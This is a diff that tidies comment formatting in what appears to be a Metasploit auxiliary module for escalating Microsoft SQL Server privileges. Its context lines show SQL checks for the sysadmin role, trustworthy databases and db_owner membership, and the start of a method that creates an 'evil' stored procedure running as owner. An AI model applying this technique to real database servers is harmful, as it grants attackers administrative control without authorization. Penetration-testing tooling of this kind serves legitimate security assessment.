@@ -88,9 +88,7 @@ class Metasploit3 < Msf::Auxiliary
     return
   end
 
-  # ----------------------------------------------
-  # Method to check if user is already sysadmin
-  # ----------------------------------------------
+  # Checks if user is already sysadmin
   def check_sysadmin
     # Setup query to check for sysadmin
     sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"
@@ -106,9 +104,7 @@ class Metasploit3 < Msf::Auxiliary
     return mystatus
   end
 
-  # ----------------------------------------------
-  # Method to get trusted databases owned by sysadmins
-  # ----------------------------------------------
+  # Gets trusted databases owned by sysadmins
   def check_trustdbs
     # Setup query
     sql = "SELECT d.name AS DATABASENAME
@@ -137,9 +133,7 @@ class Metasploit3 < Msf::Auxiliary
 
   end
 
-  # ----------------------------------------------
-  # Method to check if user has the db_owner role
-  # ----------------------------------------------
+  # Checks if user has the db_owner role
   def check_db_owner(trustdb_list)
     # Check if the user has the db_owner role is any databases
     trustdb_list.each { |db|
@@ -168,9 +162,6 @@ class Metasploit3 < Msf::Auxiliary
     }
   end
 
- # ----------------------------------------------
- # Method to escalate privileges
- # ----------------------------------------------
   def escalate_privs(dbowner_db)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     # Setup query
